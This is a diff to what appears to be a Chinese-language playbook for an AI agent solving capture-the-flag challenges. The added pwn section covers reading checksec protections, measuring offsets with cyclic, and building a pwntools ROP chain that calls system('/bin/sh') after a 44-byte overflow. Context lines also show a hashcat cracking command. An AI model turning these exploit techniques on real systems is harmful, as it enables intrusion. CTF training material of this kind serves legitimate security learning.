@@ -252,6 +252,52 @@ cat /work/found.txt; hashcat -m 9500 h.txt --show --potfile-path=/work/pot
   涉及矩阵运算、多项式、有限域、信号处理时，纯 Python 循环会慢到
   把回合预算吃光 —— 而 `numpy` 一行就够。
 
+- **★ pwn 题：`checksec` 先跑，它决定你走哪条路。**
+
+  这**不是**"检查一下"的例行公事 —— 保护组合直接决定攻击面：
+
+  | `checksec` 看到 | 意味着什么 | 该走的路 |
+  | --- | --- | --- |
+  | `No canary found` | 栈上没有随机哨兵 | 直接溢出，不用先泄漏 |
+  | `Canary found` | 返回地址前有随机数 | 必须先泄漏 canary 再溢出 |
+  | `NX enabled` | 栈不可执行 | 不能塞 shellcode，走 ROP |
+  | `PIE enabled` | 代码段地址随机 | 先泄漏一个代码地址算基址 |
+  | `Partial RELRO` | GOT 可写 | 改写 GOT 表可行 |
+  | `Full RELRO` | GOT 只读 | GOT 这条路封死，换 hook / 栈 |
+
+  **按"我想打栈溢出"去写 exploit、写到一半才发现 `Canary found`，
+  是最常见的白费回合。** 先看清楚，再动手。
+
+  ```bash
+  checksec --file=./chall     # pwntools 自带，不用 apt 装
+  ```
+
+- **★ 偏移用 `cyclic` 量，别手数。**
+
+  ```bash
+  cyclic 200 > /tmp/pat                      # 生成去重序列
+  gdb -q ./chall -ex 'run < /tmp/pat' \
+      -ex 'x/4gx $rsp' -ex quit              # 看崩在哪个值
+  cyclic -l 0x6161616c616161                 # → 44（把那个值喂回去求偏移）
+  ```
+
+  手数 `A` 的个数会在对齐/帧大小上出错，而错了之后你看到的是"链没生效"，
+  不是"偏移错了" —— 两者很难分开。
+
+- **★ 拼链用 pwntools 的 `ROP` / `fmtstr_payload`，不要手写。**
+
+  ```python
+  from pwn import *
+  elf = ELF("./chall")
+  rop = ROP(elf)                       # 内部就是 ROPgadget，镜像里已装
+  rop.call(elf.plt["system"], [next(elf.search(b"/bin/sh"))])
+  io.sendline(b"A" * 44 + rop.chain())
+  ```
+
+  格式化字符串题同理，`fmtstr_payload(offset, {目标地址: 目标值})`
+  会自己安排写入顺序与参数个数 —— 手写这部分要同时算对**参数下标、
+  字节数、写序**三件事，一处错就全盘错。
+
 - **不确定工具在不在，用 `command -v <工具>` 查。** 镜像会随题目
   类型变（逆向镜像额外带 `r2` / `gdb` / `mono`），不要假设，也不要试着
   `pip install` / `apt install` —— 沙箱只有到**本题靶站**的通路，
@@ -301,6 +347,15 @@ cat /work/found.txt; hashcat -m 9500 h.txt --show --potfile-path=/work/pot
    - 逆向：`file` → `checksec` → 静态看（`r2 -A` / `objdump`）→
      动态跑（`gdb` / `strace` / `ltrace`）。**先静态、后动态**，
      因为动态跑未知样本的代价更大。
+   - pwn：`file` + `checksec` 先看保护 —— **有没有 NX、PIE、
+     Canary、RELRO，决定走哪条路**（栈溢出 / 格式化字符串 / 堆），
+     不是先写 exploit 再试。然后用 `cyclic 200` 定位偏移，用
+     `from pwn import *` 里的 `ROP` / `fmtstr_payload` 拼链。
+     ⚠️ **题目若给了 `libc.so.6` 和 `ld-linux`，先让本地跑通再打远程**：
+     `patchelf --set-interpreter <题目给的 ld> --set-rpath <题目给的
+     libc 目录> ./chall`。不这么做的话，本地加载的是镜像自带的 libc，
+     你会看到"本地打通、远程打不通"—— 那是最难查的一类失败，
+     因为每一步看起来都对。
    - 取证/misc：先看文件类型与结构（`binwalk`、`exiftool`、
      `7z l`、`tshark`），很多题是"藏在某个文件里"。
 3. **记录证据。** 每拿到一个关键结论，记下**具体命令与输出片段** ——
